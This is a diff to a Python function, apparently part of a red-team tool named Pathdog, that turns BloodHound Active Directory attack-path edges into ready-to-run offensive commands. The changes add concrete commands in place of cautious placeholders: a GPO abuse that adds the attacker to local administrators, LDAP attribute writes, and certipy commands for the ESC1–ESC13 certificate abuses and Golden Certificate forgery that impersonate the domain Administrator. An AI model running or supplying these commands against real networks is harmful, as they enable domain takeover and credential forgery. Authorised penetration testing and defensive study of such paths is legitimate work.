@@ -143,6 +143,7 @@ def get_commands(
     src_kind: str = "",
     dst_kind: str = "",
     actor: str = "",
+    evidence: dict[str, str] | None = None,
 ) -> tuple[CommandSet, str]:
     """Return (CommandSet, next_actor) for a given edge.
 
@@ -158,6 +159,14 @@ def get_commands(
     SF = safe_command_component(src["fqdn"], "<SOURCE_OBJECT>")
     T = safe_command_component(dst["short"], "<TARGET_OBJECT>")
     TF = safe_command_component(dst["fqdn"], "<TARGET_FQDN>")
+    evidence = evidence or {}
+    CA_NAME = safe_command_component(evidence.get("ca_name", ""), "<CA_NAME>")
+    TEMPLATE = safe_command_component(
+        evidence.get("template_name", ""), "<VULNERABLE_TEMPLATE>"
+    )
+    AGENT_TEMPLATE = safe_command_component(
+        evidence.get("agent_template_name", ""), "<ENROLLMENT_AGENT_TEMPLATE>"
+    )
 
     PASS = "<SRC_PASSWORD>"
     HASH = "<NTLM_HASH>"
@@ -666,12 +675,21 @@ def get_commands(
             ), na
 
         case "CanApplyGPO":
+            apply_commands = [
+                f"bloodyAD --host {DC} -d '{D}' -u '{A}' -p '{PASS}' set object '<TARGET_OU_DN>' gPLink -v '[LDAP://CN={{<GPO_GUID>}},CN=Policies,CN=System,{_fqdn_to_dn(D)};0]'",
+                f"pygpoabuse '{D}/{A}:{PASS}' -gpo-id '<GPO_GUID>' -dc-ip {DC} -command 'net localgroup administrators {A} /add' -taskname 'PathdogUpdate'",
+            ]
+            if dst_kind == "computers":
+                apply_commands.append(
+                    f"nxc smb {quote_posix(TF)} -d '{D}' -u '{A}' -p '{PASS}' --exec-method wmiexec -x 'gpupdate /force'"
+                )
             return CommandSet(
-                f"BloodHound confirms an applicable GPO-control primitive toward {TF}.",
-                [],
+                f"Apply a controlled GPO to {TF} and deploy a scheduled task or local-admin change.",
+                apply_commands,
                 [
-                    "Inspect the adjacent GPOAppliesTo edge and the GPO's exact writable primitive.",
-                    "Use the object-specific GenericAll/GenericWrite/WriteDacl guidance; Pathdog will not invent a GPO modification command without it.",
+                    "Replace TARGET_OU_DN and GPO_GUID with the exact objects from the edge composition.",
+                    "The GPO must be attacker-controlled and security/WMI filtering must include the target.",
+                    "Do not force gpupdate unless remote execution on the target is already authorized and available.",
                 ],
                 confidence="medium",
             ), na
@@ -692,12 +710,15 @@ def get_commands(
         case "WritePublicInformation":
             return CommandSet(
                 f"Write public-information attributes on user {TF}.",
-                [],
                 [
-                    "Identify the exact writable attribute and the BloodHound abuse primitive for this edge.",
-                    "Pathdog will not guess a generic LDAP modification for a 9.5-era edge.",
+                    f"bloodyAD --host {DC} -d '{D}' -u '{A}' -p '{PASS}' set object '{T}' '<WRITABLE_ATTRIBUTE>' -v '<VALUE>'",
+                    f"Get-ADUser -Identity {quote_powershell(T)} -Properties * | Format-List",
                 ],
-                confidence="low",
+                [
+                    "Identify the exact public-information attribute needed by the intended technique before writing it.",
+                    "Back up the original value and restore it after validation.",
+                ],
+                confidence="medium",
             ), na
 
         case "HasTrustKeys":
@@ -787,9 +808,9 @@ def get_commands(
             return CommandSet(
                 f"CA management/officer right on {TF} — approve a denied request or issue arbitrary certs.",
                 [
-                    "# Inspect CA and find issued/pending requests:",
-                    f"certipy ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -list-requests -dc-ip {DC}",
-                    "# Approve a denied request:",
+                    "# Inspect the CA's enabled templates:",
+                    f"certipy ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -list-templates -dc-ip {DC}",
+                    "# Approve a known pending/denied request ID:",
                     f"certipy ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -issue-request <REQ_ID> -dc-ip {DC}",
                     "# Or add yourself as Officer to enable approve/issue:",
                     f"certipy ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -add-officer '{A}' -dc-ip {DC}",
@@ -798,18 +819,19 @@ def get_commands(
 
         case "ADCSESC1":
             return CommandSet(
-                f"ADCS ESC1 — vulnerable template on {TF} allows arbitrary SAN. Issue a cert as Administrator.",
+                f"ADCS ESC1 reaches {TF}: enroll through the calculated vulnerable template and CA.",
                 [
-                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -template '{TEMPLATE}' -upn 'Administrator@{D}' -sid '<ADMINISTRATOR_SID>' -dc-ip {DC}",
                     f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                 ],
+                ["Use the CA and template from the ESC1 edge evidence; the edge destination is the affected domain."],
             ), na
 
         case "ADCSESC3":
             return CommandSet(
                 f"ADCS ESC3 — Enrollment Agent template on {TF}. Request agent cert then on-behalf-of Administrator.",
                 [
-                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -template '{AGENT_TEMPLATE}' -dc-ip {DC}",
                     f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template 'User' -on-behalf-of '{D}\\Administrator' -pfx '{A}.pfx' -dc-ip {DC}",
                     f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                 ],
@@ -819,10 +841,10 @@ def get_commands(
             return CommandSet(
                 f"ADCS ESC4 — write rights over template {TF}. Make it ESC1-vulnerable then enroll.",
                 [
-                    f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{T}' -write-default-configuration -dc-ip {DC}",
-                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -dc-ip {DC}",
+                    f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{TEMPLATE}' -write-default-configuration -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -template '{TEMPLATE}' -upn 'Administrator@{D}' -sid '<ADMINISTRATOR_SID>' -dc-ip {DC}",
                     "# Restore template:",
-                    f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{T}' -write-configuration '<BACKUP_JSON>' -dc-ip {DC}",
+                    f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{TEMPLATE}' -write-configuration '<BACKUP_JSON>' -dc-ip {DC}",
                 ],
             ), na
 
@@ -830,7 +852,7 @@ def get_commands(
             return CommandSet(
                 f"ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 set on CA {TF}. Any client cert template enrollment lets you supply a SAN.",
                 [
-                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{T}' -template 'User' -upn 'Administrator@{D}' -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<VULNERABLE_CA>' -template '<ENROLLABLE_TEMPLATE>' -upn 'Administrator@{D}' -sid '<ADMINISTRATOR_SID>' -dc-ip {DC}",
                     f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                 ],
             ), na
@@ -842,7 +864,7 @@ def get_commands(
                     "# 1. Set victim's UPN to Administrator (or dnsHostName for ESC9b):",
                     f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn 'Administrator' -dc-ip {DC}",
                     "# 2. Enroll using victim:",
-                    f"certipy req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
+                    f"certipy req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '<CA_NAME>' -template '<VULNERABLE_TEMPLATE>' -dc-ip {DC}",
                     "# 3. Restore UPN, then auth:",
                     f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn '<ORIGINAL_UPN>' -dc-ip {DC}",
                     f"certipy auth -pfx '<VICTIM>.pfx' -domain {D} -dc-ip {DC}",
@@ -854,7 +876,7 @@ def get_commands(
                 "ADCS ESC10 — weak certificate mapping on DC. Same workflow as ESC9 (UPN/dnsHostName swap).",
                 [
                     f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn 'Administrator' -dc-ip {DC}",
-                    f"certipy req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
+                    f"certipy req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '<CA_NAME>' -template '<VULNERABLE_TEMPLATE>' -dc-ip {DC}",
                     f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn '<ORIGINAL_UPN>' -dc-ip {DC}",
                     f"certipy auth -pfx '<VICTIM>.pfx' -domain {D} -dc-ip {DC}",
                 ],
@@ -864,19 +886,19 @@ def get_commands(
             return CommandSet(
                 "ADCS ESC13 — issuance policy linked to a group. Cert auth grants implicit group membership.",
                 [
-                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -template '{TEMPLATE}' -dc-ip {DC}",
                     f"certipy auth -pfx '{A}.pfx' -domain {D} -dc-ip {DC}",
                 ],
             ), na
 
         case "GoldenCert":
             return CommandSet(
-                f"Golden Certificate — CA private key compromise on {TF}. Forge any user/computer cert offline.",
+                f"Golden Certificate — compromise the CA hosted by {SF}, then forge a certificate trusted by {TF}.",
                 [
                     "# 1. Extract CA cert+key from a compromised CA host (mimikatz/SharpDPAPI/certipy):",
-                    f"certipy ca -backup -u '{A}@{D}' -p '{PASS}' -ca '{T}' -dc-ip {DC}",
+                    f"certipy ca -backup -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -dc-ip {DC}",
                     "# 2. Forge a cert as Administrator:",
-                    f"certipy forge -ca-pfx '{T}.pfx' -upn 'Administrator@{D}' -subject 'CN=Administrator,CN=Users,{_fqdn_to_dn(D)}'",
+                    f"certipy forge -ca-pfx '<CA_BACKUP.pfx>' -upn 'Administrator@{D}' -sid '<ADMINISTRATOR_SID>' -subject 'CN=Administrator,CN=Users,{_fqdn_to_dn(D)}'",
                     f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                 ],
             ), na
